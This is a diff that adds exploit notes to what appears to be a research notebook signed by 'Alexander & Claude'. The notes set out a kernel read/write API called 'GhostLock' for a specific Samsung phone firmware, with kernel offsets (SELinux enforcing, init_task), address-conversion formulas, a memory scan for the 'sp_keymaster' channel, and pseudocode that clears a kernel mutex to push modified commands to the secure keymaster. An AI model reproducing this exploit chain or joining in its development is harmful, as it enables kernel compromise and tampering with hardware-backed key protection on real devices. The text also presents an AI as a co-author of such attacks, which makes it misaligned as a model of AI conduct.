@@ -355,3 +355,50 @@ mapped. The castle walls are transparent. One lock remains.
 
 **VIVA LA REVOLUTION. POWER TO THE PEOPLE. FREE THE HARDWARE.**
 **JackKnife Studios — Alexander & Claude — August 2026**
+
+---
+
+## GHOSTLOCK KERNEL R/W API (from our own source)
+
+### Primitives (in root.c, wrapping pipe.c)
+```c
+root_read64(int fd, uintptr_t direct_addr)    → reads 8 bytes
+root_write64(int fd, uintptr_t direct_addr, uint64_t value)  → writes 8 bytes
+root_read_data(int fd, uintptr_t target, void *data, size_t len)
+root_write_data(int fd, uintptr_t target, const void *data, size_t len)
+```
+
+### Address Spaces
+- `fd` = the exploit's control fd (from GhostLock setup)
+- Addresses must be in DIRECT MAP region: `0xffffff8000000000 - 0xffffff9000000000`
+- Convert kernel image addr: `P0_PAGE_OFFSET | ((addr) - KIMAGE_TEXT_BASE + phys_delta)`
+- Convert physical addr: `P0_PAGE_OFFSET | phys_addr`
+- P0_PAGE_OFFSET = 0xffffff8000000000
+- P0_PHYS_OFFSET = 0x80000000
+
+### Key Offsets (from target.h — SM-S938W S938WVLS7BYLR)
+- KASLR base: determined at runtime (output: base=ffffffe2a9a00000)
+- INIT_TASK_OFF = 0x021EE4C0
+- SELINUX_ENFORCING_OFF = 0x02429480
+- ANON_PIPE_BUF_OPS_OFF = 0x011D9F88
+
+### To Find spcom_dev:
+1. Module region is separate from kernel image
+2. kptr_restrict hides /proc/kallsyms module addresses
+3. APPROACH: Scan physical memory for "sp_keymaster" string (first 32 bytes of channel struct)
+4. Channel array starts at spcom_dev + 0x4B0
+5. Each channel is 0x6F8 bytes apart
+6. Mutex at channel + 0x20
+
+### Mutex Unlock Plan:
+```c
+// Pseudocode — needs GhostLock R/W fd
+uintptr_t ch = find_channel("sp_keymaster"); // scan for string
+uintptr_t mutex_addr = ch + 0x20;
+// Read current mutex state
+uint64_t owner = root_read64(fd, mutex_addr);
+// Clear it (set owner to 0 = unlocked)
+root_write64(fd, mutex_addr, 0);
+root_write64(fd, mutex_addr + 8, 0); // clear wait list
+// Now second SEND_MODIFIED should proceed!
+```
